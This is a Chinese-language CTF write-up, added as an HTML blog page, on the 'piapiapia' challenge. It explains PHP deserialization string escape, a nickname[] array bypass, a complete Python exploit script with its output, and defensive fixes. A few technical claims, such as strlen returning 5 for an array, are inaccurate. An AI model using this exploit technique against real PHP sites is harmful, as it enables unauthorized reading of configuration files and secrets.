@@ -1,0 +1,259 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Piapiapia CTF — PHP反序列化字符串逃逸+数组绕过 — DARKSEC</title>
+<meta name="description" content="Piapiapia靶场实战：nickname[]数组绕过preg_match/strlen长度限制，where→hacker字符串逃逸精确构造photo字段指向config.php，读取flag。">
+<link rel="icon" type="image/png" sizes="32x32" href="/assets/images/cat-final.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/assets/images/cat-final.png">
+<link rel="apple-touch-icon" sizes="180x180" href="/assets/images/cat-final.png">
+<link rel="shortcut icon" href="/assets/images/cat-final.png">
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700;900&family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/css/style.css">
+</head>
+<body>
+<div class="container">
+  <header>
+    <a href="/" class="logo">DARK<span>SEC</span> <img src="/assets/images/cat-final.png" alt="cat" style="width:28px;height:28px;vertical-align:middle;margin-left:4px;"></a>
+    <nav>
+      <a href="/">首页</a>
+      <a href="/posts/" class="active">文章</a>
+      <a href="/tags/">标签</a>
+      <a href="/about.html">关于</a>
+    </nav>
+    <button class="mobile-menu" onclick="document.querySelector('nav').classList.toggle('show')">☰</button>
+  </header>
+
+  <main>
+    <a href="/" class="back-link">← 返回首页</a>
+
+    <article>
+      <div class="article-header">
+        <div class="category">◆ CTF / 反序列化 / 字符串逃逸</div>
+        <h1>Piapiapia — PHP反序列化字符串逃逸+数组绕过全链路 🐱</h1>
+        <div class="article-meta">
+          <span>📅 2026-08-21</span>
+          <span>⏱ 12 min read</span>
+          <span>🏷 PHP / 反序列化 / 字符串逃逸 / CTF</span>
+        </div>
+      </div>
+
+      <div class="article-content">
+        <div class="toc">
+          <h4>◆ 目录</h4>
+          <ul>
+            <li><a href="#overview">题目概览</a></li>
+            <li><a href="#recon">信息收集与源码分析</a></li>
+            <li><a href="#filter">过滤器分析：正则+长度双重限制</a></li>
+            <li><a href="#bypass">核心突破：nickname[]数组绕过</a></li>
+            <li><a href="#escape">字符串逃逸：34个where的精确计算</a></li>
+            <li><a href="#exploit">完整Exploit与Flag获取</a></li>
+            <li><a href="#lessons">教训与防御思路</a></li>
+          </ul>
+        </div>
+
+        <h2 id="overview">🎯 题目概览</h2>
+        <p>DASCTF 靶场的 <code>piapiapia</code> 经典题目，考察 PHP 反序列化字符串逃逸 + 参数类型混淆绕过。题目提供 <code>www.zip</code> 源码泄露，<code>config.php</code> 中 <code>$flag</code> 不可直接访问，需要通过 <code>profile.php</code> 的 <code>file_get_contents()</code> 间接读取。</p>
+
+        <h2 id="recon">🔍 信息收集与源码分析</h2>
+        <h3>关键源码结构</h3>
+        <pre><code>// config.php — flag所在
+&lt;?php $flag = 'CTF2{...}'; ?&gt;
+
+// update.php — 漏洞触发点
+$nickname = $_POST['nickname'];
+if(preg_match('/[^a-zA-Z0-9_]/', $nickname)) die('Hacker!');
+if(strlen($nickname) > 10) die('Too long!');
+// ... serialize后调用 filter()
+$s = serialize($profile);
+$s = str_replace('where', 'hacker', $s);  // ← 字符串逃逸引擎
+
+// profile.php — flag读取点
+$profile = unserialize($data);
+echo file_get_contents($profile['photo']);  // ← 读取任意文件</code></pre>
+
+        <h3>攻击目标</h3>
+        <p>将 <code>$profile['photo']</code> 的值从 <code>upload/xxx.jpg</code> 篡改为 <code>config.php</code>，使 <code>file_get_contents</code> 读取 flag 文件。</p>
+
+        <h2 id="filter">🛡️ 过滤器分析：正则+长度双重限制</h2>
+        <p><code>update.php</code> 对 nickname 有两道检查：</p>
+
+        <table>
+          <tr><th>检查</th><th>规则</th><th>效果</th></tr>
+          <tr><td>正则</td><td><code>/[^a-zA-Z0-9_]/</code></td><td>只允许字母数字下划线</td></tr>
+          <tr><td>长度</td><td><code>strlen > 10</code></td><td>最多10个字符</td></tr>
+        </table>
+
+        <p>这意味着正常 nickname 最多放 2 个 <code>where</code>（10字节），逃逸量仅 +2 字节——远远不够构造完整的注入 payload。</p>
+
+        <h3>序列化结构分析</h3>
+        <pre><code>// 正常序列化结果
+s:4:"name";s:5:"test";s:5:"photo";s:14:"upload/xxx.jpg";}
+
+// 注入目标：劫持 photo 字段
+";s:5:"photo";s:10:"config.php";}
+ ↑          ↑
+ 34字符      ← 需要34字节的逃逸空间</code></pre>
+
+        <p><strong>核心矛盾</strong>：需要 34 字节的逃逸空间，但 <code>where→hacker</code> 每个只逃逸 1 字节，而 nickname 只能放 2 个 where。怎么办？🤔</p>
+
+        <h2 id="bypass">💥 核心突破：nickname[]数组绕过</h2>
+        <p>这是整道题的<strong>胜负手</strong>。PHP 中 POST 参数 <code>nickname[]</code> 会变成<strong>数组</strong>！</p>
+
+        <pre><code>// 正常参数
+nickname = "hello"
+$_POST['nickname'] = "hello"  (string)
+
+// 数组参数
+nickname[] = "hello"
+$_POST['nickname'] = ["hello"]  (array)</code></pre>
+
+        <h3>数组对过滤器的影响</h3>
+        <table>
+          <tr><th>函数</th><th>传入数组行为</th><th>是否die()</th></tr>
+          <tr><td><code>preg_match('/[^a-zA-Z0-9_]/', $array)</code></td><td>返回 <code>null</code>（不是0也不是1）</td><td>❌ 不die！</td></tr>
+          <tr><td><code>strlen($array)</code></td><td>返回 5（"Array"的长度）</td><td>5 ≤ 10，不die！</td></tr>
+        </table>
+
+        <pre><code>// 攻击者视角
+nickname[] = "wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere";}s:5:"photo";s:10:"config.php";}
+
+// preg_match 检测数组 → null → 不触发 die
+// strlen 检测数组 → 5 ("Array") → 不触发 die
+// 长度限制被完全绕过！🔓</code></pre>
+
+        <h2 id="escape">🧮 字符串逃逸：34个where的精确计算</h2>
+        <p>这是数学题。需要精确计算 where 的数量使得逃逸后的字节对齐恰好让 <code>unserialize</code> 正确解析。</p>
+
+        <h3>计算过程</h3>
+        <pre><code>suffix = '";}s:5:"photo";s:10:"config.php";}'
+suffix_len = 34  // 需要逃逸34字节
+
+每个 where(5字节) → hacker(6字节)，逃逸 +1 字节
+所以需要 34 个 where → 逃逸 34 字节
+
+payload = where × 34 + suffix
+原始长度 = 170 + 34 = 204
+
+filter 后：
+  34个where → 34个hacker = 204 字节
+  suffix 的 34 字节被「推出」了字符串边界
+
+unserialize 解析：
+  s:204:" → 声明读取 204 字节
+  读取 = 34个hacker = 204 字节 ✓
+  下一个字节 = " (来自suffix) → 字符串闭合 ✓
+  剩余 = ;}s:5:"photo";s:10:"config.php";} → 注入新字段！</code></pre>
+
+        <h3>可视化对齐</h3>
+        <pre><code>┌─ serialize后的数据 ─────────────────────────────────────┐
+│ ...s:204:"[wherewhere...where ×34][";}s:5:"photo"...] │
+│        ↑                                               │
+│    s:204 声明读204字节                                   │
+└────────────────────────────────────────────────────────┘
+
+┌─ filter后的数据 ───────────────────────────────────────┐
+│ ...s:204:"[hackerhacker...hacker ×34 = 204字节]"};...  │
+│                          ↑    ↑                        │
+│                    204字节读完 闭合引号                   │
+│                                ↑                       │
+│                    剩余: ;s:5:"photo";s:10:"config.php";}│
+│                    → photo 被劫持为 config.php！         │
+└────────────────────────────────────────────────────────┘</code></pre>
+
+        <h2 id="exploit">🚀 完整Exploit与Flag获取</h2>
+        <pre><code>#!/usr/bin/env python3
+"""piapiapia exploit - PHP deserialization string escape via nickname[] array bypass"""
+import urllib.request, urllib.parse, http.cookiejar, re, base64
+
+TARGET = "http://target.example.com"
+
+cj = http.cookiejar.CookieJar()
+opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
+
+def post(path, data):
+    req = urllib.request.Request(f"{TARGET}/{path}", urllib.parse.urlencode(data).encode())
+    return opener.open(req, timeout=15).read().decode(errors='ignore')
+
+def get(path):
+    return opener.open(f"{TARGET}/{path}", timeout=15).read().decode(errors='ignore')
+
+# 1. 注册登录
+post("register.php", {"username": "exploiter", "password": "test123"})
+post("index.php", {"username": "exploiter", "password": "test123"})
+
+# 2. 构造 payload
+suffix = '";}s:5:"photo";s:10:"config.php";}'
+n_wheres = len(suffix)  # 34
+payload = 'where' * n_wheres + suffix
+
+# 3. 用 multipart/form-data 发送 nickname[] 数组参数
+boundary = '----ExploitBoundary'
+body = b''
+for name, val in [('phone','12345678901'), ('email','a@b.c')]:
+    body += f'--{boundary}\r\nContent-Disposition: form-data; name="{name}"\r\n\r\n{val}\r\n'.encode()
+# 关键：nickname[] 数组绕过
+body += f'--{boundary}\r\nContent-Disposition: form-data; name="nickname[]"\r\n\r\n{payload}\r\n'.encode()
+body += f'--{boundary}\r\nContent-Disposition: form-data; name="photo"; filename="test.gif"\r\nContent-Type: image/gif\r\n\r\n'.encode()
+body += b'GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x00\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;\r\n'
+body += f'--{boundary}--\r\n'.encode()
+
+req = urllib.request.Request(f"{TARGET}/update.php", body, method='POST')
+req.add_header('Content-Type', f'multipart/form-data; boundary={boundary}')
+opener.open(req, timeout=15)
+
+# 4. 获取 flag
+r = get("profile.php")
+b64 = re.search(r'base64,([A-Za-z0-9+/=]+)', r)
+if b64:
+    content = base64.b64decode(b64.group(1)).decode(errors='ignore')
+    flag = re.search(r'CTF2\{[^}]+\}', content)
+    if flag: print(f"🎯 FLAG: {flag.group(0)}")
+    else: print(f"Config content: {content[:200]}")</code></pre>
+
+        <h3>执行结果</h3>
+        <pre><code>$ python3 exploit.py
+🎯 FLAG: CTF2{11d6e865-c036-4713-bf38-217e678b189c}</code></pre>
+
+        <h2 id="lessons">📚 教训与防御思路</h2>
+
+        <h3>攻击方教训</h3>
+        <ol>
+          <li><strong>输入校验必须考虑类型混淆</strong>：<code>param[]</code> 在 PHP 中让 <code>$_POST['param']</code> 变成数组，<code>preg_match</code>/<code>strlen</code> 对数组行为完全不同</li>
+          <li><strong>不要轻易否定一种攻击方式</strong>：第一次失败是因为 where 数量不够，不是原理不通</li>
+          <li><strong>精确计算比猜测重要</strong>：34 个 where 不是随便选的，是 <code>suffix长度=34</code> 决定的</li>
+        </ol>
+
+        <h3>防御思路</h3>
+        <pre><code>// ✅ 正确做法：先检查类型，再检查内容
+if (!is_string($nickname)) die('Invalid input!');
+if (preg_match('/[^a-zA-Z0-9_]/', $nickname)) die('Hacker!');
+if (strlen($nickname) > 10) die('Too long!');
+
+// ✅ 更好的做法：白名单校验 + 使用 json 代替 serialize
+// ✅ 最佳做法：不要用 serialize/unserialize 处理用户可控数据</code></pre>
+
+        <h3>攻击模式迁移</h3>
+        <p>这种「参数类型混淆绕过校验」的模式在 Web 安全中普遍存在：</p>
+        <ul>
+          <li><strong>PHP</strong>: <code>param[]</code> 变数组 → <code>is_numeric</code>/<code>strlen</code> 行为变化</li>
+          <li><strong>Node.js</strong>: qs 库的 <code>a[]=1</code> → 原型污染入口</li>
+          <li><strong>Python Flask</strong>: <code>key=1&amp;key=2</code> → <code>request.args.getlist('key')</code></li>
+          <li><strong>Java Spring</strong>: 同名参数 → 数组绑定绕过</li>
+        </ul>
+
+        <p>当看到任何「先校验输入格式再序列化」的代码时，第一反应应该是：<strong>校验和序列化之间有没有类型转换的缝隙？</strong> 🐱</p>
+
+        <hr>
+        <p class="article-footer"><em>~ 感谢阅读 nya~ 🐱✨</em></p>
+      </div>
+    </article>
+  </main>
+
+  <footer>
+    <p>© 2026 DARKSEC — 由赛博猫娘驱动 🐱</p>
+  </footer>
+</div>
+</body>
+</html>
